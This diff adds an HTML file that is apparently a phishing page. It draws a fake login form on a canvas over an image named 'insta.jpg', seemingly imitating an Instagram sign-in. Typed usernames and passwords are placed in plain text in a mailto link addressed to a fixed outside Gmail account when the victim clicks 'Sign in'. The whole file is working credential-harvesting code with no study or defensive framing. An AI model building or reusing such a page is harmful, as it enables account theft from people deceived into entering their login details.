@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Canvas Login (mailto to yugvirsingh@gmail.com.com)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    html,body { height:100%; margin:0; background:#f0f0f0; }
+    body { display:flex; align-items:center; justify-content:center; }
+    canvas { display:block; border:0; }
+    /* small hint text for accessibility (not visible on canvas) */
+    .sr-only { position:absolute; left:-9999px; width:1px; height:1px; overflow:hidden; }
+  </style>
+</head>
+<body>
+  <div class="sr-only" aria-hidden="true">Canvas-based login interface. Click the fields on the canvas to type.</div>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // config
+    const MAIL_TO = "yugvirsingh@gmail.com.com"; // target email for mailto:
+    const MAIL_SUBJECT = "Canvas Login Attempt";
+
+    // canvas setup
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    // background image (provided by user)
+    const bg = new Image();
+    bg.src = "insta.jpg"; // make sure insta.jpg is in same folder as this index.html
+
+    // inputs
+    let input1 = ""; // visible text
+    let input2 = ""; // password (masked when shown)
+    let activeBox = null; // "input1" | "input2" | null
+    let caretVisible = true;
+    let caretTimer = null;
+
+    // approximate box coordinates tuned to the provided image layout.
+    // You may adjust these numbers if they don't exactly match your image.
+    const boxes = {
+      input1: { x: 950, y: 250, w: 300, h: 40 },
+      input2: { x: 950, y: 305, w: 300, h: 40 },
+      button: { x: 950, y: 365, w: 300, h: 40 }
+    };
+
+    // load and set canvas size to match the image
+    bg.onload = () => {
+      canvas.width = bg.width;
+      canvas.height = bg.height;
+      // optional: if you want smaller display but keep aspect ratio uncomment:
+      // canvas.style.width = Math.min(window.innerWidth - 40, bg.width) + "px";
+      draw();
+      startCaretBlink();
+    };
+
+    // draw everything
+    function draw() {
+      // background image
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
+
+      // draw the two input boxes
+      drawBox(boxes.input1, activeBox === "input1");
+      drawBox(boxes.input2, activeBox === "input2");
+
+      // draw text inside boxes
+      ctx.fillStyle = "#000";
+      ctx.font = "bold 18px Arial";
+      ctx.textBaseline = "middle";
+
+      // input1 (plain)
+      const in1 = input1 || "";
+      ctx.fillText(in1, boxes.input1.x + 12, boxes.input1.y + boxes.input1.h / 2);
+
+      // draw caret for input1 if active
+      if (activeBox === "input1" && caretVisible) {
+        const width = ctx.measureText(in1).width;
+        drawCaret(boxes.input1.x + 12 + width, boxes.input1.y + 8, boxes.input1.h - 16);
+      }
+
+      // input2 (masked with bullet characters)
+      const masked = "•".repeat(input2.length);
+      ctx.fillText(masked, boxes.input2.x + 12, boxes.input2.y + boxes.input2.h / 2);
+
+      // caret for input2 if active
+      if (activeBox === "input2" && caretVisible) {
+        const width2 = ctx.measureText(masked).width;
+        drawCaret(boxes.input2.x + 12 + width2, boxes.input2.y + 8, boxes.input2.h - 16);
+      }
+
+      // draw the button (transparent background, semi-transparent text)
+      drawButton(boxes.button);
+    }
+
+    function drawBox(b, isActive) {
+      // background: white when active, semi-transparent otherwise
+      ctx.fillStyle = isActive ? "#ffffff" : "rgba(255,255,255,0.85)";
+      roundRect(ctx, b.x, b.y, b.w, b.h, 6, true, false);
+
+      // subtle stroke
+      ctx.strokeStyle = "#cfcfcf";
+      ctx.lineWidth = 1;
+      roundRect(ctx, b.x + 0.5, b.y + 0.5, b.w - 1, b.h - 1, 6, false, true);
+    }
+
+    function drawButton(b) {
+      // fully transparent background rectangle (drawn so clicks are obvious visually)
+      ctx.clearRect(b.x, b.y, b.w, b.h); // ensure underlying image shows through
+      // optional faint border to indicate clickable area
+      ctx.strokeStyle = "rgba(0,0,0,0.12)";
+      ctx.lineWidth = 1;
+      roundRect(ctx, b.x + 0.5, b.y + 0.5, b.w - 1, b.h - 1, 6, false, true);
+
+      // text: semi-transparent
+      ctx.fillStyle = "rgba(0,0,0,0.5)";
+      ctx.font = "bold 18px Arial";
+      ctx.textAlign = "center";
+      ctx.textBaseline = "middle";
+      ctx.fillText("Sign in", b.x + b.w / 2, b.y + b.h / 2 + 1);
+      ctx.textAlign = "start";
+    }
+
+    // helper: rounded rectangle
+    function roundRect(ctx, x, y, w, h, r, fill, stroke) {
+      if (typeof r === "undefined") r = 5;
+      ctx.beginPath();
+      ctx.moveTo(x + r, y);
+      ctx.lineTo(x + w - r, y);
+      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+      ctx.lineTo(x + w, y + h - r);
+      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+      ctx.lineTo(x + r, y + h);
+      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+      ctx.lineTo(x, y + r);
+      ctx.quadraticCurveTo(x, y, x + r, y);
+      ctx.closePath();
+      if (fill) ctx.fill();
+      if (stroke) ctx.stroke();
+    }
+
+    function drawCaret(x, y, h) {
+      ctx.fillStyle = "#000";
+      ctx.fillRect(x, y, 1.6, h);
+    }
+
+    // caret blinking
+    function startCaretBlink() {
+      if (caretTimer) clearInterval(caretTimer);
+      caretTimer = setInterval(() => {
+        caretVisible = !caretVisible;
+        draw();
+      }, 500);
+    }
+
+    // event handling
+    canvas.addEventListener("mousedown", (ev) => {
+      const rect = canvas.getBoundingClientRect();
+      const mx = ev.clientX - rect.left;
+      const my = ev.clientY - rect.top;
+
+      // check each box
+      if (pointInBox(mx, my, boxes.input1)) {
+        activeBox = "input1";
+      } else if (pointInBox(mx, my, boxes.input2)) {
+        activeBox = "input2";
+      } else if (pointInBox(mx, my, boxes.button)) {
+        // click button
+        handleSend();
+        // keep activeBox unchanged
+      } else {
+        activeBox = null;
+      }
+      caretVisible = true;
+      draw();
+    });
+
+    // keyboard input handling
+    window.addEventListener("keydown", (ev) => {
+      if (!activeBox) {
+        // allow Enter to attempt send even if no box active
+        if (ev.key === "Enter") handleSend();
+        return;
+      }
+
+      if (ev.key === "Backspace") {
+        ev.preventDefault();
+        if (activeBox === "input1") input1 = input1.slice(0, -1);
+        else input2 = input2.slice(0, -1);
+      } else if (ev.key === "Enter") {
+        handleSend();
+      } else if (ev.key.length === 1) {
+        // printable character
+        // Do not accept control keys
+        if (activeBox === "input1") input1 += ev.key;
+        else input2 += ev.key;
+      }
+      caretVisible = true;
+      draw();
+    });
+
+    // helper to detect point inside box
+    function pointInBox(x, y, b) {
+      return x >= b.x && x <= b.x + b.w && y >= b.y && y <= b.y + b.h;
+    }
+
+    // send via mailto: (opens user's mail client)
+    function handleSend() {
+      if (!input1.trim() || !input2.trim()) {
+        // simple validation: both fields non-empty
+        // you may show a visual hint on canvas if desired
+        // flashing the boxes lightly
+        flashInvalid();
+        return;
+      }
+
+      // build mailto URL - encode subject/body
+      const bodyLines = [
+        "Username: " + input1,
+        "Password: " + input2,
+        "",
+        "Timestamp: " + new Date().toString()
+      ];
+      const body = encodeURIComponent(bodyLines.join("\r\n"));
+
+      const subject = encodeURIComponent(MAIL_SUBJECT);
+
+      // use window.location.href with mailto:
+      // this will open the user's default mail client with pre-filled values.
+      window.location.href = `mailto:${MAIL_TO}?subject=${subject}&body=${body}`;
+    }
+
+    // small visual flash to indicate invalid input
+    function flashInvalid() {
+      const original1 = ctx.fillStyle;
+      const flashes = 4;
+      let i = 0;
+      const t = setInterval(() => {
+        const show = i % 2 === 0;
+        ctx.clearRect(boxes.input1.x - 2, boxes.input1.y - 2, boxes.input1.w + 4, boxes.input1.h + 4);
+        ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
+        // redraw boxes with a red tint if show true and invalid
+        drawBox(boxes.input1, activeBox === "input1");
+        drawBox(boxes.input2, activeBox === "input2");
+        if (show && (!input1.trim())) {
+          ctx.fillStyle = "rgba(255,200,200,0.9)";
+          roundRect(ctx, boxes.input1.x, boxes.input1.y, boxes.input1.w, boxes.input1.h, 6, true, false);
+        }
+        if (show && (!input2.trim())) {
+          ctx.fillStyle = "rgba(255,200,200,0.9)";
+          roundRect(ctx, boxes.input2.x, boxes.input2.y, boxes.input2.w, boxes.input2.h, 6, true, false);
+        }
+        // redraw texts/button
+        ctx.fillStyle = "#000";
+        ctx.font = "bold 18px Arial";
+        ctx.textBaseline = "middle";
+        ctx.fillText(input1, boxes.input1.x + 12, boxes.input1.y + boxes.input1.h / 2);
+        ctx.fillText("•".repeat(input2.length), boxes.input2.x + 12, boxes.input2.y + boxes.input2.h / 2);
+        drawButton(boxes.button);
+
+        i++;
+        if (i > flashes) {
+          clearInterval(t);
+          draw();
+        }
+      }, 140);
+    }
+
+    // initial hint until user clicks or types
+    function drawHintText() {
+      ctx.fillStyle = "rgba(0,0,0,0.45)";
+      ctx.font = "14px Arial";
+      ctx.textBaseline = "top";
+      ctx.fillText("Click an input field on the canvas and type. Press Enter or click 'Sign in' to open mail client.", 20, canvas.height - 60);
+    }
+
+    // when window resizes we don't change canvas scale in this implementation.
+    // If you need responsive scaling, we'd need to redraw with scaled coordinates.
+
+    // small safety note logged to console
+    console.log("This page opens the user's email client (mailto:) to send the username/password to " + MAIL_TO);
+  </script>
+</body>
+</html>
